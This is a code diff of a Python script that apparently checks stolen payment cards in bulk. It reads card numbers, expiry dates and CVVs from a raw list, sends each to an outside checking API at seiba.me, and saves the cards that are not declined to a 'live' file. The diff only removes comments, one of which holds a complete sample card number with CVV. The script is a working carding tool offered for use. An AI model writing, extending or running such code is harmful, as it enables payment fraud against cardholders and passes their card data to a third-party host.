@@ -16,7 +16,6 @@ def header():
 ''')
 
 def content_file():
-    # get current path
     path = os.getcwd()
     file_path = path + '/data/raw/card.txt'
     file = open(file_path, 'r')
@@ -29,16 +28,13 @@ def content_file():
 
 def card_auth(ccn, month, year, cvv):
 
-    # get request result from api https://seiba.me/card?ccn=4023470603031261&month=01&year=2025&cvv=284
     url = 'https://seiba.me/card?ccn=' + ccn + '&month=' + month + '&year=' + year + '&cvv=' + cvv
     r = requests.get(url)
 
-    # get result
     result = r.json()
     if result['status'] == 200:
         
         if result['message']['status'] != 'declined':
-            # save to file data/result/live.txt
             file_path = os.getcwd() + '/data/result/live.txt'
             file = open(file_path, 'a')
             file.write(ccn + '|' + month + '|' + year + '|' + cvv + ' => ' + result['message']['msg'] + '\n')
@@ -67,5 +63,4 @@ if __name__ == '__main__':
             cvv = line[3]
 
             print(card_auth(ccn, month, year, cvv))
-            # add delay 1s
             time.sleep(2)
